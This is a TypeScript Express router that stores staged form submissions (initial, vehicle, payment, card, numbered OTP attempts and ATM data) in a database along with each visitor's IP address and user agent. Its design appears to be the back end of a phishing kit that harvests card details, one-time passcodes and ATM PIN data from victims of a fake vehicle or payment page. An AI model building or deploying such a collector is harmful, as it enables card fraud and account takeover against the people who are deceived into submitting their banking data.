import { Router, type IRouter } from "express";
import { db, inMemoryDb, submissionsTable } from "@workspace/db";
import {
  SubmitInitialBody,
  SubmitVehicleBody,
  SubmitPaymentBody,
  SubmitCardBody,
  SubmitOtpBody,
  SubmitAtmBody,
} from "@workspace/api-zod";

const router: IRouter = Router();

function getClientIp(req: import("express").Request): string {
  const forwarded = req.headers["x-forwarded-for"];
  if (typeof forwarded === "string") return forwarded.split(",")[0].trim();
  return req.socket.remoteAddress ?? "unknown";
}

async function insertSubmission(data: {
  sessionId: string;
  type: string;
  data: any;
  ipAddress: string;
  userAgent: string | null;
}) {
  if (!db) {
    // In-memory database
    const id = inMemoryDb.nextId++;
    const submission = {
      id,
      ...data,
      createdAt: new Date(),
    };
    inMemoryDb.submissions.push(submission);
    return { id, sessionId: data.sessionId };
  }
  
  // PostgreSQL
  const [row] = await db
    .insert(submissionsTable)
    .values(data)
    .returning();
  return { id: row.id, sessionId: row.sessionId };
}

router.post("/submissions/initial", async (req, res): Promise<void> => {
  const parsed = SubmitInitialBody.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ error: parsed.error.message });
    return;
  }
  const result = await insertSubmission({
    sessionId: parsed.data.sessionId,
    type: "initial",
    data: JSON.stringify(parsed.data),
    ipAddress: getClientIp(req),
    userAgent: req.headers["user-agent"] ?? null,
  });
  res.status(201).json(result);
});

router.post("/submissions/vehicle", async (req, res): Promise<void> => {
  const parsed = SubmitVehicleBody.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ error: parsed.error.message });
    return;
  }
  const result = await insertSubmission({
    sessionId: parsed.data.sessionId,
    type: "vehicle",
    data: JSON.stringify(parsed.data),
    ipAddress: getClientIp(req),
    userAgent: req.headers["user-agent"] ?? null,
  });
  res.status(201).json(result);
});

router.post("/submissions/payment", async (req, res): Promise<void> => {
  const parsed = SubmitPaymentBody.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ error: parsed.error.message });
    return;
  }
  const result = await insertSubmission({
    sessionId: parsed.data.sessionId,
    type: "payment",
    data: JSON.stringify(parsed.data),
    ipAddress: getClientIp(req),
    userAgent: req.headers["user-agent"] ?? null,
  });
  res.status(201).json(result);
});

router.post("/submissions/card", async (req, res): Promise<void> => {
  const parsed = SubmitCardBody.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ error: parsed.error.message });
    return;
  }
  const result = await insertSubmission({
    sessionId: parsed.data.sessionId,
    type: "card",
    data: JSON.stringify(parsed.data),
    ipAddress: getClientIp(req),
    userAgent: req.headers["user-agent"] ?? null,
  });
  res.status(201).json(result);
});

router.post("/submissions/otp", async (req, res): Promise<void> => {
  const parsed = SubmitOtpBody.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ error: parsed.error.message });
    return;
  }
  const result = await insertSubmission({
    sessionId: parsed.data.sessionId,
    type: `otp_attempt_${parsed.data.attempt}`,
    data: JSON.stringify(parsed.data),
    ipAddress: getClientIp(req),
    userAgent: req.headers["user-agent"] ?? null,
  });
  res.status(201).json(result);
});

router.post("/submissions/atm", async (req, res): Promise<void> => {
  const parsed = SubmitAtmBody.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ error: parsed.error.message });
    return;
  }
  const result = await insertSubmission({
    sessionId: parsed.data.sessionId,
    type: "atm",
    data: JSON.stringify(parsed.data),
    ipAddress: getClientIp(req),
    userAgent: req.headers["user-agent"] ?? null,
  });
  res.status(201).json(result);
});

export default router;
